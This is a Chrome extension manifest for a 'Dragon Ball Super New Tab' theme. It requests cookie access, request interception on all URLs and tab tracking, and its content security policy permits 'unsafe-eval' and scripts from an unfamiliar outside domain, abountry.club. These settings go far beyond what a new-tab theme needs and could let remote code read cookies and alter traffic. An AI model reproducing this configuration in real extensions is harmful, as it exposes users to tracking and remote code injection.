{
  "background": {
    "scripts": [
      "my_script.js"
    ]
  },
  "name": "Dragon Ball Super New Tab",
  "version": "1.3.2",
  "description": "__MSG_desc__",
  "manifest_version": 2,
  "icons": {
    "128": "128-ico.png"
  },
  "default_locale": "en",
  "update_url": "https://clients2.google.com/service/update2/crx",
  "chrome_url_overrides": {
    "newtab": "newtab.html"
  },
  "browser_action": {
    "default_icon": "128-ico.png",
    "default_title": "Dragon Ball Super New Tab"
  },
  "permissions": [
    "webRequest",
    "webRequestBlocking",
    "<all_urls>",
    "tabs",
    "storage",
    "cookies",
    "webNavigation",
    "unlimitedStorage"
  ],
  "content_security_policy": "script-src 'self' 'unsafe-eval'  https://www.google-analytics.com https://ssl.google-analytics.com https://abountry.club;  object-src 'self'"
}
